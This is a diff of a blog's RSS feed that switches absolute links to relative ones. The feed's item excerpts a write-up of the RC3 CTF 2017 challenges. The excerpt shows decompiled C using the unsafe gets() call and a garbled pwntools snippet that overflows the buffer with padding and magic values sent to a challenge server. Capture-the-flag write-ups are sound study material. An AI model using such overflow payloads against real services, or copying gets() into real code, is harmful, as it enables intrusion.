@@ -2,20 +2,20 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>RC3CTF2017 on /home/rhama/</title>
-    <link>rhamaa.github.io/tags/rc3ctf2017/</link>
+    <link>/tags/rc3ctf2017/</link>
     <description>Recent content in RC3CTF2017 on /home/rhama/</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     
-	<atom:link href="rhamaa.github.io/tags/rc3ctf2017/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/tags/rc3ctf2017/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>RC3 CTF 2017 - Write Up</title>
-      <link>rhamaa.github.io/post/2017-12-1-rc3ctf-2017/</link>
+      <link>/post/2017-12-1-rc3ctf-2017/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>rhamaa.github.io/post/2017-12-1-rc3ctf-2017/</guid>
+      <guid>/post/2017-12-1-rc3ctf-2017/</guid>
       <description>v2 = 0; v1 = 0; printf(&amp;ldquo;Enter Key: &amp;ldquo;); gets((char *)&amp;amp;v0); if ( v2 == 0xCAFEF00D &amp;amp;&amp;amp; v1 == 0xC0FFEE ) sub_80484EF(); puts(&amp;ldquo;Error: Invalid key!&amp;quot;); srand(1u); init(); } baby=remote(&amp;quot;18.216.183.46&amp;quot;,4200)p=&amp;quot;&amp;ldquo;p+=&amp;quot;A&amp;quot;*16p+=p32(0xC0FFEE)# v1p+=p32(0xCAFEF00D)# v2baby.sendlineafter(&amp;rdquo;: &amp;ldquo;,p)printbaby.</description>
     </item>
     
